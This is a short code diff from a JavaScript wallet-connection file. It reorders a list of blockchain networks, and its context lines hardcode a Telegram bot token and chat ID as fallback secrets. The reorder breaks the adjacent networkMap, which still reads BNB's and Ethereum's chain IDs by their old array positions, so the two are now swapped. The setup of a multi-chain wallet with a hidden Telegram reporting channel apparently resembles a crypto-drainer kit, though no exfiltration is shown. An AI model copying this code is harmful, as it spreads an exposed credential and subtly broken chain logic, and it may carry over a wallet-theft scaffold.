@@ -75,7 +75,7 @@ if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc'
 const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4835655591'
 
-const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
+const networks = [mainnet, bsc, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
   'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
   'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
